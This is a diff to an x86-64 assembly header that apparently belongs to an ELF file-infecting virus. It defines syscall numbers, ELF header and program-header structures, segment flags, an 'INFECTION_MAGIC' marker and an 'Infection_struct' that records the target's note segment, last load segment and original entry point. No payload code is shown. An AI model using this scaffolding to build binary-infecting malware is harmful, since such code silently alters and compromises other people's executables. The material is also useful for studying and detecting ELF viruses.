@@ -7,7 +7,6 @@
 %define SYS_CLOSE       0x03
 %define SYS_LSEEK       0x08
 %define SYS_MMAP        0x09
-%define SYS_MPROTECT    0x0a
 %define SYS_MUNMAP      0x0b
 %define SYS_MREMAP      0x19
 %define SYS_MSYNC       0x1a
@@ -16,8 +15,6 @@
 %define SYS_FTRUNCATE   0x4d
 %define SYS_CHDIR       0x50
 %define SYS_FCHDIR      0x51
-%define SYS_PTRACE      0x65
-%define SYS_GETPPID     0x6e
 %define SYS_GETDENTS64  0xd9
 
 %define O_RDONLY        0
@@ -73,7 +70,7 @@ struc       Elf64_Ehdr
     e_shstrndx:     resw    1
 endstruc
 
-%define ELFHDR_SIZE     64
+%define ELFHDR_SIZE     0x40
 
 %define ELF_MAGIC       0x464c457f
 %define EI_CLASS        4
@@ -96,18 +93,25 @@ struc       Elf64_Phdr
 endstruc
 
 %define PT_NOTE         4
+%define PT_LOAD         1
+%define PF_X            (1 << 0)
+%define PF_W            (1 << 1)
+%define PF_R            (1 << 2)
 
 %define INFECTION_MAGIC 0xcafefeed
 
 struc       Infection_struct
-    inf_elfhdr:     resb    ELFHDR_SIZE
-    inf_filesize:   resq    1
-    inf_map:        resq    1
-    inf_notehdr:    resq    1
-    inf_fd:         resd    1
+    inf_elfhdr:         resb    ELFHDR_SIZE
+    inf_filesize:       resq    1
+    inf_map:            resq    1
+    inf_notehdr:        resq    1
+    inf_last_pt_load:   resq    1
+    inf_new_filesize:   resq    1
+    inf_oldentry:       resq    1
+    inf_fd:             resd    1
 endstruc
 
-%define INFECTOR_STRUCT_SIZE    0xc0
+%define INFECTOR_STRUCT_SIZE    0x80
 
 %define RELA_SIZE   0x30
 
